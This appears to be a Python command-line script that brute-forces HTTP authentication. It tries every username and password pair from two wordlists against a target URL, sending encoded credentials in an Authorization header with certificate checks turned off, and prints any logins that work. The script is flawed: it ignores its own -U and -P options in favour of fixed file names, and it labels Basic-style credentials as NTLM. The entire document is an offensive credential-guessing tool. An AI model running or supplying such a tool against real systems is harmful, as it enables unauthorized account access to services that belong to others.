#!/usr/bin/env python3

import requests, argparse, base64
from urllib3.exceptions import InsecureRequestWarning

parser = argparse.ArgumentParser("basic-auth-bruter.py")
parser.add_argument("-H", type=str, help="The URL", required=True)
parser.add_argument("-U", type=str, help="Userfile", required=True)
parser.add_argument("-P", type=str, help="Passwordfile", required=True)
args = parser.parse_args()

url = args.H
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

creds = []
counter = 1
try:
	with open("usernames.txt", "r") as userfile:
		usernames = [line.strip() for line in userfile.read().split("\n") if line]
	with open("passwords.txt", "r") as passfile:
		passwords = [line.strip() for line in passfile.read().split("\n") if line]
	for username in usernames:
		for password in passwords:
			payload = b"NTLM " + base64.b64encode(username.encode("ascii") + b":" + password.encode("ascii"))
			response = requests.get(url, headers={"Authorization":payload}, verify=False)
			if response.status_code != 200:
				print(f"Tried {username}:{password:<15} as {str(payload.decode('UTF-8')):<50} attempt #{counter}")
				counter += 1
			else:
				print("##Login Found##")
				print(f'{username}:{password}')
				creds.append(username + ":" + password)
				continue
	if creds:
		print("\n[+]These credentials were found!")
		print(creds)
	else:
		print("\n\n[-]No credentials found.")

except KeyboardInterrupt:
	if creds:
		print(creds)
		print("\nInterrupted by user. Quitting ...")
	else:
		print("\n\n[-]No credentials found.")
		print("\nInterrupted by user. Quitting ...")